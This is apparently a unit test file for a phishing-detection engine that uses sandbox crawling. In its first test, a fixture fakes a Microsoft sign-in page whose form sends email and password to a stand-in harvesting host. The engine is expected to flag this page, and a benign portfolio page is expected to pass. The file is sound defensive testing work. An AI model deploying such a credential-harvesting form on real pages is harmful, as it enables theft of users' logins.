"""Unit tests for Phase 2 Integrated Decision Engine with Tier 3 Deep Sandboxing."""

import unittest
from unittest.mock import MagicMock
import numpy as np

from src.decision_engine.engine import (
    LayeredDecisionEngine,
    DecisionVerdict,
    RiskLevel,
)
from src.sandbox.crawler import DeepSandboxCrawler
from src.threat_intelligence.manager import ThreatIntelligenceManager


class TestPhase2Integration(unittest.TestCase):
    """Integration test suite for Phase 2 Tier 3 deep sandboxing."""

    def test_multi_tenant_cloud_phish_caught_by_sandbox(self):
        """Verify zero-day phishing on multi-tenant cloud host (firebaseapp.com) is caught and escalated by Tier 3 Sandbox."""
        phish_html = """
        <html>
            <head><title>Sign in to your Microsoft account</title></head>
            <body>
                <form action="https://data-collector-drop.top/harvest" method="post">
                    <input type="email" name="loginfmt">
                    <input type="password" name="passwd">
                    <button type="submit">Sign in</button>
                </form>
            </body>
        </html>
        """
        # Mock crawler returning the malicious DOM
        crawler = DeepSandboxCrawler(mock_driver=lambda url: (phish_html, None))

        # Mock ML model returning a low probability (e.g. 0.20, fooled by clean-looking path)
        mock_model = MagicMock()
        mock_model.predict_proba.return_value = np.array([[0.80, 0.20]])

        engine = LayeredDecisionEngine(
            ml_model=mock_model,
            threat_intel_manager=ThreatIntelligenceManager(providers=[]),
            sandbox_crawler=crawler,
        )

        url = "https://app-tenant-portal.firebaseapp.com/login"
        res = engine.evaluate_url(url)

        # Confirm Tier 3 Sandbox intercepted and escalated the verdict
        self.assertEqual(res.verdict, DecisionVerdict.CONFIRMED_MALICIOUS)
        self.assertEqual(res.risk_level, RiskLevel.CRITICAL)
        self.assertIn("sandbox_report", res.structural_indicators)
        self.assertTrue(any("Tier 3 Sandbox" in exp for exp in res.evidence_based_explanation))
        self.assertTrue(any("brand impersonation" in exp.lower() for exp in res.evidence_based_explanation))

    def test_clean_multi_tenant_app_not_falsely_blocked(self):
        """Verify benign user app on multi-tenant host without brand spoofing or password harvesting is not confirmed malicious."""
        clean_html = """
        <html>
            <head><title>Personal Portfolio</title></head>
            <body>
                <h1>Hello, I am a developer</h1>
                <p>Check out my open-source projects.</p>
            </body>
        </html>
        """
        crawler = DeepSandboxCrawler(mock_driver=lambda url: (clean_html, None))

        mock_model = MagicMock()
        mock_model.predict_proba.return_value = np.array([[0.90, 0.10]])

        engine = LayeredDecisionEngine(
            ml_model=mock_model,
            threat_intel_manager=ThreatIntelligenceManager(providers=[]),
            sandbox_crawler=crawler,
        )

        url = "https://my-clean-portfolio.firebaseapp.com/"
        res = engine.evaluate_url(url)

        self.assertNotEqual(res.verdict, DecisionVerdict.CONFIRMED_MALICIOUS)
        self.assertNotEqual(res.risk_level, RiskLevel.CRITICAL)


if __name__ == "__main__":
    unittest.main()

